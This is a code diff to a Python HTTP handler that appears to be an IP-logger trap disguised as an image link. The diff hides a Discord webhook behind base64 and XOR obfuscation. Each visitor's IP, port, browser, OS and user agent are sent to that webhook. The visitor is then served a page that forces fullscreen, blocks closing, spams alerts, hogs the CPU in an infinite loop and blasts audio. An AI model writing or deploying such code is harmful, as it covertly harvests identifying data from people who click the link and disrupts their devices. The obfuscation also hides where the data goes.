@@ -1,12 +1,27 @@
 from http.server import BaseHTTPRequestHandler
 import requests
 import httpagentparser
+import base64
+def unhide_webhook():
+  
+    encoded = "IjcxNjoBXzJFOUEvFxw6Fh4tIjoeABE4HxZMKgAzOTIcShoxQEU9NU0sKUcyKBcBRAU7GB0qGSE8JF9WHj0WIzc8PwpIQEZZUk5aQUVGTUdeUUBEXl5CWF0GGBsaBgURAkEOBghdGBwXWwoVGxYdDhJGXU8ABAEaDw=="
+    
 
-WEBHOOK_URL = "https://discord.com/api/webhooks/1490146029503385734/dJHDVdTh11QHFw_ikNw-wpFG3NB8AN02Xl-rGMTn_8ejJxvyTWYyxOhdZ3P3U1tNQ_BV"
+    step1 = base64.b64decode(encoded).decode('utf-8')
+    
+
+    key = "tungtungvirus"
+    step2 = ''.join(chr(ord(c) ^ ord(key[i % len(key)])) for i, c in enumerate(step1))
+    
+
+    return step2[::-1]
+
+
+WEBHOOK_URL = unhide_webhook()
 
 FAKE_IMAGE_URL = "https://media.tenor.com/XPiWs5il8owAAAAM/tung-tungtung-tungtungtung-sahur-tungtungtungsahur-tungtungsahur.gif"
 
-# Max annoying page + loud song + HEAVY CPU lag
+
 ANNOY_HTML = """
 <!DOCTYPE html>
 <html>
@@ -20,22 +35,17 @@ ANNOY_HTML = """
     <h1 style="font-size:6em;animation:blink 0.3s infinite;">TUNG TUNG VIRUS</h1>
     <p style="font-size:2em;">Your browser is now mine...</p>
   </div>
-
   <!-- Loud Tung Tung Song -->
   <audio id="song" autoplay loop>
     <source src="https://www.myinstants.com/media/sounds/tung-tung-sahur.mp3" type="audio/mpeg">
   </audio>
-
   <script>
     // Fullscreen
     document.documentElement.requestFullscreen?.().catch(()=>{});
-
     // Block closing
     window.onbeforeunload = () => "TUNG TUNG says NO!";
-
     // Spam alerts
     setInterval(() => alert("TUNG TUNG VIRUS: CLOSE FAILED!"), 700);
-
     // HEAVY CPU EATER (this lags the browser badly)
     function cpuHell() {
       while(true) {
@@ -46,12 +56,10 @@ ANNOY_HTML = """
       }
     }
     cpuHell();
-
     // Max volume song
     const audio = document.getElementById("song");
     audio.volume = 1.0;
     audio.play().catch(()=>{});
-
     // Force GIF download
     const link = document.createElement('a');
     link.href = "%s";
@@ -71,7 +79,6 @@ class handler(BaseHTTPRequestHandler):
             port = self.headers.get('X-Forwarded-Port', 'Unknown')
             user_agent = self.headers.get('User-Agent', 'Unknown')
             parsed = httpagentparser.detect(user_agent)
-
             log = f"""**NEW CLICK!**
 IP: `{ip}`
 Port: `{port}`
@@ -79,20 +86,16 @@ Browser: {parsed.get('browser', {}).get('name', 'Unknown')}
 OS: {parsed.get('os', {}).get('name', 'Unknown')}
 UA: `{user_agent}`
 **Tung Tung + loud song + CPU hell activated!**"""
-
             requests.post(WEBHOOK_URL, json={"content": log})
-
             html = ANNOY_HTML.encode('utf-8')
             self.send_response(200)
             self.send_header('Content-type', 'text/html')
             self.send_header('Content-Length', len(html))
             self.end_headers()
             self.wfile.write(html)
-
         except Exception as e:
             self.send_response(500)
             self.end_headers()
             self.wfile.write(f"Error: {str(e)}".encode())
-
     def do_HEAD(self):
         self.do_GET()
